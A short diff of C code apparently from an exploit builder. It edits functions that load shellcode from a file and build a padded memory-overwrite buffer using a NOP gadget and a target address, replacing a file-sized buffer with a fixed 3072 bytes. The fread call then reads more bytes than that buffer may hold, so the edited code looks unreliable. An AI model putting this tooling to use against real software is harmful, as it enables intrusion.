@@ -136,7 +136,7 @@ v8 prepare_shellcode(char* filename, v64* constants) {
 
     fseek(fp, 0, SEEK_END);
     file_size = ftell(fp);
-    shellcode = v8_new(file_size);
+    shellcode = v8_new(3072);
     rewind(fp);
 
     fread(shellcode.data, file_size, sizeof(uint64_t), fp);
@@ -274,7 +274,7 @@ v8 create_overwrite(uint64_t nop_gadget, uint64_t addr) {
     v8 z16 = v8_zeros(16);
     v8 z32 = v8_zeros(32);
 
-    v8 ret = v8_new(0x580);
+    v8 ret = v8_new(1408);
     v8_append(&ret, v8_zeros(padd));            // '\0' * 0x500
     v8_append(&ret, z32);                       // 32x
     v8_append(&ret, v64_convert_v8(block1));    // 2Q
